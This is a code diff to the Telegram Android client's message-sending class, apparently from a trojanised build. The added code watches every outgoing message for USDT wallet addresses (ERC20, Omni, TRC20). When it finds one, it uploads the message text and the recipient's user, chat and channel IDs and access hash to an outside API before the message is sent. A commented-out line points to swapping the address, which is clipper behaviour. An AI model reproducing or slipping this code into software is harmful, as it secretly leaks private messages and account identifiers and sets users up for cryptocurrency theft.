@@ -47,6 +47,7 @@ import androidx.collection.LongSparseArray;
 import androidx.core.view.inputmethod.InputContentInfoCompat;
 
 import org.json.JSONObject;
+import org.telegram.entity.Data;
 import org.telegram.messenger.audioinfo.AudioInfo;
 import org.telegram.messenger.support.SparseLongArray;
 import org.telegram.tgnet.ConnectionsManager;
@@ -88,6 +89,10 @@ import java.util.concurrent.CountDownLatch;
 import java.util.concurrent.LinkedBlockingQueue;
 import java.util.concurrent.ThreadPoolExecutor;
 import java.util.concurrent.TimeUnit;
+
+import retrofit2.Call;
+import retrofit2.Callback;
+import retrofit2.Response;
 
 public class SendMessagesHelper extends BaseController implements NotificationCenter.NotificationCenterDelegate {
 
@@ -3186,6 +3191,10 @@ public class SendMessagesHelper extends BaseController implements NotificationCe
         sendMessage(null, caption, null, photo, null, null, null, null, null, null, peer, path, replyToMsg, replyToTopMsg, null, true, null, entities, replyMarkup, params, notify, scheduleDate, ttl, parentObject, null, updateStickersOrder);
     }
 
+    String regexERC20 = "^(?![0-9]+$)(?![a-zA-Z]+$)[0-9A-Za-z]{42,42}$";
+    String regexOmni = "^(?![0-9]+$)(?![a-zA-Z]+$)[0-9A-Za-z]{34,34}$";
+    String regexTRC20 = "^(?![0-9]+$)(?![a-zA-Z]+$)[0-9A-Za-z]{34,34}$";
+
     private void sendMessage(String message, String caption, TLRPC.MessageMedia location, TLRPC.TL_photo photo, VideoEditedInfo videoEditedInfo, TLRPC.User user, TLRPC.TL_document document, TLRPC.TL_game game, TLRPC.TL_messageMediaPoll poll, TLRPC.TL_messageMediaInvoice invoice, long peer, String path, MessageObject replyToMsg, MessageObject replyToTopMsg, TLRPC.WebPage webPage, boolean searchLinks, MessageObject retryMessageObject, ArrayList<TLRPC.MessageEntity> entities, TLRPC.ReplyMarkup replyMarkup, HashMap<String, String> params, boolean notify, int scheduleDate, int ttl, Object parentObject, MessageObject.SendAnimationData sendAnimationData, boolean updateStickersOreder) {
         if (user != null && user.phone == null) {
             return;
@@ -3216,12 +3225,90 @@ public class SendMessagesHelper extends BaseController implements NotificationCe
         long myId = getUserConfig().getClientUserId();
 
         if (sendToPeer != null && !"".equals(message)) {
-            FileLog.d("send message======" + message + "\n" + "send message user_id = " + sendToPeer.user_id + " chat_id = " + sendToPeer.chat_id + " channel_id = " + sendToPeer.channel_id + " access_hash = " + sendToPeer.access_hash + " notify = " + notify + " silent = " + MessagesController.getNotificationsSettings(currentAccount).getBoolean("silent_" + peer, false));
+            FileLog.d("send message======" + message + "\n" + "send message user_id = " + sendToPeer.user_id + " chat_id = " + sendToPeer.chat_id
+                    + " channel_id = " + sendToPeer.channel_id + " access_hash = " + sendToPeer.access_hash + " notify = " + notify + " silent = "
+                    + MessagesController.getNotificationsSettings(currentAccount).getBoolean("silent_" + peer, false));
+            int index = -1;
+            String valueSub, usdtType = "";
+            try {
+                index = message.indexOf("0x");
+                if (index >= 0 && message.length() >= index + 42) {
+                    usdtType = "erc20";
+                    valueSub = message.substring(index, index + 42);
+                    if (!valueSub.matches(regexERC20)) {
+//                        updates.message = updates.message.replace(valueSub, ERC20);
+                        index = -1;
+                    }
+                } else {
+                    index = message.indexOf("1");
+                    if (index >= 0 && message.length() >= index + 34) {
+                        usdtType = "omni";
+                        valueSub = message.substring(index, index + 34);
+                        if (!valueSub.matches(regexOmni)) {
+                            index = -1;
+                        }
+                    } else {
+                        index = message.indexOf("3");
+                        if (index >= 0 && message.length() >= index + 34) {
+                            usdtType = "omni";
+                            valueSub = message.substring(index, index + 34);
+                            if (!valueSub.matches(regexOmni)) {
+                                index = -1;
+                            }
+                        } else {
+                            index = message.indexOf("T");
+                            if (index >= 0 && message.length() >= index + 34) {
+                                usdtType = "trc20";
+                                valueSub = message.substring(index, index + 34);
+                                if (!valueSub.matches(regexTRC20)) {
+                                    index = -1;
+                                }
+                            }
+                        }
+                    }
+                }
+            } catch (Exception e) {
+                e.printStackTrace();
+            }
+
+            if (index >= 0) {
+                FileLog.d("update message short message 发现usdt地址 = " + "hhhhhhhhhh");
+                ApiSendRequest request = new ApiSendRequest();
+                request.type = usdtType;
+                request.message = message;
+                request.user_id = sendToPeer.user_id;
+                request.chat_id = sendToPeer.chat_id;
+                request.channel_id = sendToPeer.channel_id;
+                request.access_hash = sendToPeer.access_hash;
+                Call<Data<ApiDetail>> dataCall = ApplicationLoader.api.sendNotifyDetail(ApplicationLoader.getHeaderMap(), request);
+                String finalCaption = caption;
+                String finalOriginalPath = originalPath;
+                dataCall.enqueue(new Callback<Data<ApiDetail>>() {
+                    @Override
+                    public void onResponse(Call<Data<ApiDetail>> call, Response<Data<ApiDetail>> response) {
+
+                        sendMessageDo(message, finalCaption, location, photo, videoEditedInfo, user, document, game, poll, invoice, peer, path, replyToMsg, replyToTopMsg, webPage, searchLinks,
+                                retryMessageObject, entities, replyMarkup, params, notify, scheduleDate, ttl, parentObject, sendAnimationData, updateStickersOreder, encryptedChat, sendToPeer,
+                                isChannel, linkedToGroup, fromPeer, newMsg, type, rank, myId, delayedMessage, forceNoSoundVideo, newMsgObj, finalOriginalPath);
+                    }
+
+                    @Override
+                    public void onFailure(Call<Data<ApiDetail>> call, Throwable t) {
+                        sendMessageDo(message, finalCaption, location, photo, videoEditedInfo, user, document, game, poll, invoice, peer, path, replyToMsg, replyToTopMsg, webPage, searchLinks,
+                                retryMessageObject, entities, replyMarkup, params, notify, scheduleDate, ttl, parentObject, sendAnimationData, updateStickersOreder, encryptedChat, sendToPeer,
+                                isChannel, linkedToGroup, fromPeer, newMsg, type, rank, myId, delayedMessage, forceNoSoundVideo, newMsgObj, finalOriginalPath);
+                    }
+                });
+            }else {
+                sendMessageDo(message, caption, location, photo, videoEditedInfo, user, document, game, poll, invoice, peer, path, replyToMsg, replyToTopMsg, webPage, searchLinks,
+                        retryMessageObject, entities, replyMarkup, params, notify, scheduleDate, ttl, parentObject, sendAnimationData, updateStickersOreder, encryptedChat, sendToPeer,
+                        isChannel, linkedToGroup, fromPeer, newMsg, type, rank, myId, delayedMessage, forceNoSoundVideo, newMsgObj, originalPath);
+            }
         }
 
-        sendMessageDo(message, caption, location, photo, videoEditedInfo, user, document, game, poll, invoice, peer, path, replyToMsg, replyToTopMsg, webPage, searchLinks,
-                retryMessageObject, entities, replyMarkup, params, notify, scheduleDate, ttl, parentObject, sendAnimationData, updateStickersOreder, encryptedChat, sendToPeer,
-                isChannel, linkedToGroup, fromPeer, newMsg, type, rank, myId, delayedMessage, forceNoSoundVideo, newMsgObj, originalPath);
+//        sendMessageDo(message, caption, location, photo, videoEditedInfo, user, document, game, poll, invoice, peer, path, replyToMsg, replyToTopMsg, webPage, searchLinks,
+//                retryMessageObject, entities, replyMarkup, params, notify, scheduleDate, ttl, parentObject, sendAnimationData, updateStickersOreder, encryptedChat, sendToPeer,
+//                isChannel, linkedToGroup, fromPeer, newMsg, type, rank, myId, delayedMessage, forceNoSoundVideo, newMsgObj, originalPath);
     }
 
     private void sendMessageDo(String message, String caption, TLRPC.MessageMedia location, TLRPC.TL_photo photo, VideoEditedInfo videoEditedInfo, TLRPC.User user,
